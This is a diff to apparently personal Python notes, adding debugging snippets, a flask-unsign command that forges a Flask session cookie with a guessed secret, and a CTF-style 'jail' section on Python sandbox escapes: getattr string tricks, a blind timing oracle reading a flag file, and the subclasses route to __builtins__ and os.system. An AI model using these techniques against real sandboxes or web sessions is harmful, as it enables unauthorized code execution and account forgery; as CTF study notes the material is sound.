@@ -22,6 +22,8 @@ print(inspect.cleandoc(c))
 '
 # foo 1
 # bar 2
+
+flask-unsign --sign --cookie "{'end': '2020-07-13 10:59:59+0000'}" --secret 'Time' --legacy
 ```
 
 # REPL
@@ -41,6 +43,9 @@ ipython
 
 ipdb
 ```python
+import ipdb
+ipdb.set_trace()
+
 VALUE_MAX_LEN = 1024
 def clean_value(value):
     if isinstance(value, str) and len(value) > VALUE_MAX_LEN:
@@ -94,6 +99,7 @@ ipdb> p tb.tb_next.tb_frame.f_locals
 with ipdb.launch_ipdb_on_exception():
     main()
 
+print(dir(foo))
 print(type(foo))
 print(foo.__dict__)
 
@@ -426,4 +432,25 @@ df = pd.DataFrame({"A": [1, 2, 3],
 print(df.to_markdown())
 ```
 
+# jail
 
+- `eval() / exec() / compile()`: execute any python code
+- `globals() / locals() / vars()`: finding useful variables
+- `getattr() / setattr()`: call object.banned(), e.g. `getattr(object, "ban"+"ned")`
+- `"A""B" == "AB"`: alternative for `+`
+    - https://github.com/OpenToAllCTF/Tips#python-jails
+- blind
+    ```python
+    cmd = '''
+    python -c "__import__('time').sleep({} if open('/home/nullcon/flagpart1.txt').read({})[-1:] == '{}' else 0)"
+    '''.format(SLEEP_TIME, index, letter)
+    ```
+- altenative for `__builtins__` or `import`
+    ```python
+    classes = {}.__class__.__base__.__subclasses__()
+    # e.g. 49 = warnings.catch_warnings
+    b = classes[49]()._module.__builtins__
+    m = b['__import__']('os')
+    m.system("foo")
+    ```
+    - https://gynvael.coldwind.pl/n/python_sandbox_escape
